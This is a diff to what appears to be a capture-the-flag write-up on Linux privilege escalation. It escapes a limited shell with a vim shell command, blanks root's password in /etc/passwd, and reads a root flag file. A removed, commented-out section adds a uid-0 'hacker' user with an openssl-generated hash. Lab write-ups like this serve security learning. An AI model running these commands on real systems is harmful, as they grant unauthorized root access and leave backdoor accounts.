@@ -266,7 +266,7 @@ done
 
 This is the file which dosen't allow us to execute more than 3 command attempts per login 
 
-we can easily bypass this by this command : 
+we can easily bypass this by this by following command : 
 
 ```
 vim -c "!sh" 
@@ -291,7 +291,12 @@ But now this time we can also edit files on behalf of root user:
 vim /etc/passwd
 ```
 
-remove `x` from root 
+remove `x` from root.	
+It should looke like this:
+
+```
+root::0:0:root:/root:/bin/bash
+```
 
 To save file use:  
 
@@ -306,41 +311,3 @@ su root
 ```
 cat /root/root.txt
 ```
-<!-- 
-generate a password hash: 
-
-```
-openssl passwd -1 -salt hacker hacker
-```
-
-```
-hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
-```
-
-Eg.
-```
-hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash
-```
-
-Now
-
-```
-vim /etc/passwd
-```
-
-And paste this hash at the end of the `/etc/passwd` file
-
-
-for overwriting the file. 
-
-```
-su hacker
-```
-
-Password is `hacker`
-
-BOOM YOU ARE ROOT NOW 
-
-```
-cat /root/root.txt
-``` -->
